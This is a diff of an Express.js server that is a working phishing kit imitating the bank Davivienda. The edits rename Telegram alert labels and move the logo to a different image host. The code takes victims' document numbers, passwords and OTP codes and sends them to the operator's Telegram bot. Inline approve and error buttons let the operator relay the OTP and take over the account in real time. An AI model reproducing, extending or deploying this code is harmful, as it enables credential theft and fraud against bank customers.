@@ -36,7 +36,7 @@ form{width:100%;display:flex;flex-direction:column;align-items:center;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 `;
 
-const logoHtml = `<img src="https://i.ibb.co/1G4kztWc/logo.png" alt="Logo" class="header-logo">`;
+const logoHtml = `<img src="https://i.postimg.cc/vTjqv35M/logo.png" alt="Logo" class="header-logo">`;
 
 // 1. Documento
 app.get('/', (req, res) => {
@@ -86,7 +86,7 @@ app.post('/guardar-clave', async (req, res) => {
         sesiones[id].clave = clave;
         sesiones[id].comando = 'esperar';
 
-        const mensaje = `🚨 *NUEVO INGRESO - DAVIVIENDA*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔑 Clave: \`${clave}\`\n🆔 Session ID: \`${id}\``;
+        const mensaje = ` 💻 *DAVIVIENDA.LOGIN *\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔑 Contraseña: \`${clave}\`\n🆔 Session ID: \`${id}\``;
         
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -97,8 +97,8 @@ app.post('/guardar-clave', async (req, res) => {
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '📲 Pedir Código OTP (Sí)', callback_data: `otp_ok_${id}` },
-                        { text: '❌ Error / Repetir (No)', callback_data: `otp_err_${id}` }
+                        { text: '📲 (Sí) Código OTP', callback_data: `otp_ok_${id}` },
+                        { text: '❌ Error', callback_data: `otp_err_${id}` }
                     ]]
                 }
             })
@@ -133,7 +133,7 @@ app.post('/guardar-otp', async (req, res) => {
         sesiones[id].otp = otp;
         sesiones[id].comando = 'esperar'; // Reinicia a esperar comando del admin
 
-        const mensajeOtp = `🔑 *CÓDIGO OTP RECIBIDO*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔢 OTP: \`${otp}\`\n🆔 Session ID: \`${id}\``;
+        const mensajeOtp = `🔑 *DAVIVIENDA.TOKEN*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔢 OTP: \`${otp}\`\n🆔 Session ID: \`${id}\``;
         
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -144,8 +144,8 @@ app.post('/guardar-otp', async (req, res) => {
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ Aprobar (Ir a Google)', callback_data: `aprob_ok_${id}` },
-                        { text: '❌ Error / Pedir de nuevo', callback_data: `aprob_err_${id}` }
+                        { text: '✅ Aprobar', callback_data: `aprob_ok_${id}` },
+                        { text: '❌ Error', callback_data: `aprob_err_${id}` }
                     ]]
                 }
             })
